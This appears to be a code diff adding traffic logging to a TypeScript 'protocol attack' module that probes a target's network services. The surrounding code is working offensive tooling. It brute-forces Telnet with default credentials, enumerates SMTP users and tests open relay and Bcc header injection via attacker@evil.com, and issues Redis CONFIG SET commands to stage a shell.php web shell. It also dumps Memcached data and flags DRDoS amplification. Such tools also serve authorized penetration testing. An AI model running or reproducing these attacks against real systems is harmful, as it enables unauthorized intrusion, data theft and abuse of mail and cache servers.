@@ -25,6 +25,7 @@ export interface ProtocolJob {
   active: boolean;
   results: ProtocolResult[];
   summary: { vulns: number; open: number; tested: number };
+  trafficLog: string[];
 }
 
 const jobs = new Map<string, ProtocolJob>();
@@ -49,30 +50,48 @@ const TELNET_CREDS = [
   { u: "admin", p: "password" }, { u: "root", p: "" }, { u: "admin", p: "" },
 ];
 
-function tcpConnect(host: string, port: number, timeout: number): Promise<{ connected: boolean; banner: string }> {
+function tsFmt() { return new Date().toISOString().slice(11, 23); }
+function pushLog(log: string[], lines: string[]) { log.push(...lines); if (log.length > 2000) log.splice(0, log.length - 2000); }
+
+function tcpConnect(host: string, port: number, timeout: number, trafficLog?: string[]): Promise<{ connected: boolean; banner: string }> {
+  if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] • TCP → Probe ${host}:${port} (timeout: ${timeout}ms)`]);
   return new Promise((resolve) => {
     const sock = net.createConnection({ host, port, family: 4 });
     sock.setTimeout(timeout);
     let banner = "";
-    sock.on("connect", () => {});
-    sock.on("data", (d: Buffer) => { banner += d.toString().slice(0, 512); });
+    sock.on("connect", () => { if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] • TCP ✓ Connected to ${host}:${port}`]); });
+    sock.on("data", (d: Buffer) => {
+      const s = d.toString().slice(0, 512);
+      banner += s;
+      if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ← ${s.replace(/\r?\n/g, " | ").slice(0, 200)}`]);
+    });
     setTimeout(() => {
       sock.destroy();
       resolve({ connected: true, banner: banner.trim() });
     }, Math.min(timeout, 2000));
-    sock.on("error", () => resolve({ connected: false, banner: "" }));
+    sock.on("error", (e) => { if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ! ${host}:${port} — ${e.message}`]); resolve({ connected: false, banner: "" }); });
     sock.on("timeout", () => { sock.destroy(); resolve({ connected: banner.length > 0, banner: banner.trim() }); });
   });
 }
 
-function tcpSend(host: string, port: number, data: string, timeout: number): Promise<string> {
+function tcpSend(host: string, port: number, data: string, timeout: number, trafficLog?: string[]): Promise<string> {
   return new Promise((resolve) => {
     const sock = net.createConnection({ host, port, family: 4 });
     sock.setTimeout(timeout);
     let resp = "";
-    sock.on("connect", () => { sock.write(data); });
-    sock.on("data", (d: Buffer) => { resp += d.toString().slice(0, 4096); });
-    sock.on("error", () => resolve(resp));
+    sock.on("connect", () => {
+      if (trafficLog) pushLog(trafficLog, [
+        `[${tsFmt()}] ─── TCP SEND ─────────────────────────────────────`,
+        `[${tsFmt()}] → [${host}:${port}] ${data.replace(/\r?\n/g, " ").slice(0, 200)}`,
+      ]);
+      sock.write(data);
+    });
+    sock.on("data", (d: Buffer) => {
+      const s = d.toString().slice(0, 4096);
+      resp += s;
+      if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ← ${s.replace(/\r?\n/g, " | ").slice(0, 200)}`]);
+    });
+    sock.on("error", (e) => { if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ! ERROR: ${e.message}`]); resolve(resp); });
     sock.on("timeout", () => { sock.destroy(); resolve(resp); });
     setTimeout(() => { sock.destroy(); resolve(resp); }, timeout);
   });
@@ -112,7 +131,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
   const id = makeId();
   const job: ProtocolJob = {
     id, config, startTime: Date.now(),
-    active: true, results: [],
+    active: true, results: [], trafficLog: [],
     summary: { vulns: 0, open: 0, tested: 0 },
   };
   jobs.set(id, job);
@@ -124,6 +143,9 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     if (r.status === "info" || r.status === "vuln") job.summary.open++;
   };
 
+  const tcpConn = (host: string, port: number, timeout: number) => tcpConnect(host, port, timeout, job.trafficLog);
+  const tcpSnd = (host: string, port: number, data: string, timeout: number) => tcpSend(host, port, data, timeout, job.trafficLog);
+
   const delay = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));
 
   const runAll = async () => {
@@ -134,7 +156,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── SSH ────────────────────────────────────────────────────────────────
     if (techniques.includes("ssh") && job.active) {
       const port = config.customPorts?.["ssh"] ?? 22;
-      const { connected, banner } = await tcpConnect(config.target, port, 4000);
+      const { connected, banner } = await tcpConn(config.target, port, 4000);
       if (!connected) {
         add({ protocol: "SSH", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
@@ -144,7 +166,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
 
         for (const { u, p } of SSH_CREDS) {
           if (!job.active) break;
-          const resp = await tcpSend(config.target, port, `SSH-2.0-OpenSSH_8.0\r\n`, 2000);
+          const resp = await tcpSnd(config.target, port, `SSH-2.0-OpenSSH_8.0\r\n`, 2000);
           if (resp.includes("SSH-")) {
             add({ protocol: "SSH", port, status: "info", detail: `SSH handshake test with cred ${u}:${p} — full brute force requires SSH library`, timestamp: Date.now() });
             break;
@@ -162,13 +184,13 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── SMTP ────────────────────────────────────────────────────────────────
     if (techniques.includes("smtp") && job.active) {
       const port = config.customPorts?.["smtp"] ?? 25;
-      const { connected, banner } = await tcpConnect(config.target, port, 4000);
+      const { connected, banner } = await tcpConn(config.target, port, 4000);
       if (!connected) {
         add({ protocol: "SMTP", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
         add({ protocol: "SMTP", port, status: "info", detail: `SMTP open — Banner: ${banner.slice(0, 120)}`, data: banner, timestamp: Date.now() });
 
-        const ehlo = await tcpSend(config.target, port, `EHLO attacker.example.com\r\n`, 3000);
+        const ehlo = await tcpSnd(config.target, port, `EHLO attacker.example.com\r\n`, 3000);
         const starttls = ehlo.toLowerCase().includes("starttls");
         const auth = ehlo.toLowerCase().includes("auth");
         add({ protocol: "SMTP", port, status: "info", detail: `EHLO response — STARTTLS: ${starttls ? "YES" : "NO (plaintext auth possible)"} — AUTH: ${auth ? "YES" : "NO"}`, timestamp: Date.now() });
@@ -176,7 +198,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
         // User enumeration via VRFY
         for (const user of SMTP_USERS) {
           if (!job.active) break;
-          const vrfyResp = await tcpSend(config.target, port, `EHLO test\r\nVRFY ${user}\r\n`, 2000);
+          const vrfyResp = await tcpSnd(config.target, port, `EHLO test\r\nVRFY ${user}\r\n`, 2000);
           const exists = vrfyResp.includes("252") || vrfyResp.includes("250") || vrfyResp.includes(user);
           if (exists) {
             add({ protocol: "SMTP", port, status: "vuln", detail: `USER ENUMERATION — VRFY ${user} → ${vrfyResp.trim().slice(0, 80)} — user likely exists`, timestamp: Date.now() });
@@ -185,13 +207,13 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
         }
 
         // Open relay test
-        const relayResp = await tcpSend(config.target, port,
+        const relayResp = await tcpSnd(config.target, port,
           `EHLO attacker.com\r\nMAIL FROM:<attacker@evil.com>\r\nRCPT TO:<victim@unrelated-domain.com>\r\n`, 3000);
         const openRelay = relayResp.includes("250") && !relayResp.includes("550") && !relayResp.includes("554");
         add({ protocol: "SMTP", port, status: openRelay ? "vuln" : "info", detail: openRelay ? `OPEN RELAY DETECTED — Server will forward mail to unrelated domains — can be used for spam` : `Open relay check passed (relay rejected)`, timestamp: Date.now() });
 
         // Header injection
-        const injResp = await tcpSend(config.target, port,
+        const injResp = await tcpSnd(config.target, port,
           `EHLO test\r\nMAIL FROM:<a\r\nBcc:victim@evil.com\r\n@test.com>\r\n`, 2000);
         const injected = injResp.includes("250");
         if (injected) {
@@ -219,25 +241,25 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── Redis ───────────────────────────────────────────────────────────────
     if (techniques.includes("redis") && job.active) {
       const port = config.customPorts?.["redis"] ?? 6379;
-      const { connected, banner } = await tcpConnect(config.target, port, 3000);
+      const { connected, banner } = await tcpConn(config.target, port, 3000);
       if (!connected) {
         add({ protocol: "Redis", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
-        const pong = await tcpSend(config.target, port, "PING\r\n", 2000);
+        const pong = await tcpSnd(config.target, port, "PING\r\n", 2000);
         const unauth = pong.includes("+PONG") || pong.includes("+OK");
         add({ protocol: "Redis", port, status: unauth ? "vuln" : "info", detail: unauth ? `UNAUTHENTICATED REDIS ACCESS — PING returned PONG without credentials — full data access possible` : `Redis requires authentication — PING rejected`, timestamp: Date.now() });
 
         if (unauth) {
           for (const cmd of REDIS_CMDS) {
             if (!job.active) break;
-            const r = await tcpSend(config.target, port, `${cmd}\r\n`, 2000);
+            const r = await tcpSnd(config.target, port, `${cmd}\r\n`, 2000);
             if (r && !r.includes("-ERR")) {
               add({ protocol: "Redis", port, status: "vuln", detail: `Redis ${cmd} → ${r.trim().slice(0, 100)}`, timestamp: Date.now() });
             }
             await delay(100);
           }
 
-          const configSet = await tcpSend(config.target, port, "CONFIG SET dir /tmp\r\nCONFIG SET dbfilename shell.php\r\n", 2000);
+          const configSet = await tcpSnd(config.target, port, "CONFIG SET dir /tmp\r\nCONFIG SET dbfilename shell.php\r\n", 2000);
           if (configSet.includes("+OK")) {
             add({ protocol: "Redis", port, status: "vuln", detail: `REDIS RCE VECTOR — CONFIG SET accepted — can write arbitrary files to disk (web shell deployment possible)`, timestamp: Date.now() });
           }
@@ -248,7 +270,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── MongoDB ─────────────────────────────────────────────────────────────
     if (techniques.includes("mongodb") && job.active) {
       const port = config.customPorts?.["mongodb"] ?? 27017;
-      const { connected, banner } = await tcpConnect(config.target, port, 3000);
+      const { connected, banner } = await tcpConn(config.target, port, 3000);
       if (!connected) {
         add({ protocol: "MongoDB", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
@@ -278,7 +300,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── Telnet ──────────────────────────────────────────────────────────────
     if (techniques.includes("telnet") && job.active) {
       const port = config.customPorts?.["telnet"] ?? 23;
-      const { connected, banner } = await tcpConnect(config.target, port, 4000);
+      const { connected, banner } = await tcpConn(config.target, port, 4000);
       if (!connected) {
         add({ protocol: "Telnet", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
@@ -286,7 +308,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
 
         for (const { u, p } of TELNET_CREDS) {
           if (!job.active) break;
-          const resp = await tcpSend(config.target, port, `${u}\r\n${p}\r\n`, 2000);
+          const resp = await tcpSnd(config.target, port, `${u}\r\n${p}\r\n`, 2000);
           const success = resp.toLowerCase().includes("$") || resp.toLowerCase().includes("#") || resp.toLowerCase().includes("welcome");
           if (success) {
             add({ protocol: "Telnet", port, status: "vuln", detail: `TELNET CREDENTIALS WORK — ${u}:${p} authenticated — shell access possible`, timestamp: Date.now() });
@@ -299,7 +321,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── RDP ─────────────────────────────────────────────────────────────────
     if (techniques.includes("rdp") && job.active) {
       const port = config.customPorts?.["rdp"] ?? 3389;
-      const { connected, banner } = await tcpConnect(config.target, port, 4000);
+      const { connected, banner } = await tcpConn(config.target, port, 4000);
       if (!connected) {
         add({ protocol: "RDP", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
@@ -323,7 +345,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── MySQL ───────────────────────────────────────────────────────────────
     if (techniques.includes("mysql") && job.active) {
       const port = config.customPorts?.["mysql"] ?? 3306;
-      const { connected, banner } = await tcpConnect(config.target, port, 3000);
+      const { connected, banner } = await tcpConn(config.target, port, 3000);
       if (!connected) {
         add({ protocol: "MySQL", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
@@ -341,7 +363,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── SMB ─────────────────────────────────────────────────────────────────
     if (techniques.includes("smb") && job.active) {
       const port = config.customPorts?.["smb"] ?? 445;
-      const { connected, banner } = await tcpConnect(config.target, port, 3000);
+      const { connected, banner } = await tcpConn(config.target, port, 3000);
       if (!connected) {
         add({ protocol: "SMB", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
@@ -384,11 +406,11 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── Memcached ───────────────────────────────────────────────────────────
     if (techniques.includes("memcached") && job.active) {
       const port = config.customPorts?.["memcached"] ?? 11211;
-      const resp = await tcpSend(config.target, port, "stats\r\n", 3000);
+      const resp = await tcpSnd(config.target, port, "stats\r\n", 3000);
       if (resp.includes("STAT")) {
         const version = resp.match(/STAT version ([^\r\n]+)/)?.[1] ?? "unknown";
         add({ protocol: "Memcached", port, status: "vuln", detail: `UNAUTHENTICATED MEMCACHED — stats command returned data, version: ${version} — can be used for DRDoS amplification (x51,000 amplification factor)`, data: resp.slice(0, 200), timestamp: Date.now() });
-        const allResp = await tcpSend(config.target, port, "get * \r\n", 2000);
+        const allResp = await tcpSnd(config.target, port, "get * \r\n", 2000);
         if (allResp.length > 0) {
           add({ protocol: "Memcached", port, status: "vuln", detail: `Memcached data accessible — can read/write all cached data without authentication`, timestamp: Date.now() });
         }
@@ -400,7 +422,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── LDAP ────────────────────────────────────────────────────────────────
     if (techniques.includes("ldap") && job.active) {
       const port = config.customPorts?.["ldap"] ?? 389;
-      const { connected, banner } = await tcpConnect(config.target, port, 3000);
+      const { connected, banner } = await tcpConn(config.target, port, 3000);
       if (!connected) {
         add({ protocol: "LDAP", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
@@ -425,7 +447,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
     // ─── VNC ─────────────────────────────────────────────────────────────────
     if (techniques.includes("vnc") && job.active) {
       const port = config.customPorts?.["vnc"] ?? 5900;
-      const { connected, banner } = await tcpConnect(config.target, port, 3000);
+      const { connected, banner } = await tcpConn(config.target, port, 3000);
       if (!connected) {
         add({ protocol: "VNC", port, status: "failed", detail: `Port ${port} closed or filtered`, timestamp: Date.now() });
       } else {
@@ -433,7 +455,7 @@ export function startProtocolAttack(config: ProtocolAttackConfig): ProtocolJob {
         const noAuth = banner.includes("RFB 003.003") || banner.includes("003.007");
         add({ protocol: "VNC", port, status: "vuln", detail: `VNC OPEN — Protocol version RFB ${version} — ${noAuth ? "OLD VERSION — may allow no-auth access" : "requires password (may be brute-forceable)"}`, data: banner, timestamp: Date.now() });
 
-        const noPassResp = await tcpSend(config.target, port, `RFB 003.008\n\x00\x00\x00\x01`, 2000);
+        const noPassResp = await tcpSnd(config.target, port, `RFB 003.008\n\x00\x00\x00\x01`, 2000);
         if (noPassResp.includes("\x00\x00\x00\x00")) {
           add({ protocol: "VNC", port, status: "vuln", detail: `VNC NO-AUTH MODE — Security type 1 (None) accepted — no password required for remote desktop access`, timestamp: Date.now() });
         }
